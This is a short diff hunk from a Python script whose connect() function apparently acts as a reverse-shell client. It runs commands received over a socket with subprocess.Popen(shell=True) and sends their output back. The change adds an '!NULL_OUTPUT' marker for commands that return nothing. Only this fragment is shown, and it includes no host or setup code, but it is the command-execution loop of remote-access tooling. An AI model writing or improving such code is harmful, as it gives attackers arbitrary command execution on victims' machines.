@@ -86,8 +86,13 @@ def connect():
 
 		else:
 			CMD = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-			s.send(CMD.stdout.read())
-			s.send(CMD.stderr.read())
+			stdoutRead = CMD.stdout.read()
+			stderrRead = CMD.stderr.read()
+			if (stdoutRead == '' and stderrRead == ''):
+				s.send('!NULL_OUTPUT')
+			else:
+				s.send(stdoutRead)
+				s.send(stderrRead)
 
 
 #
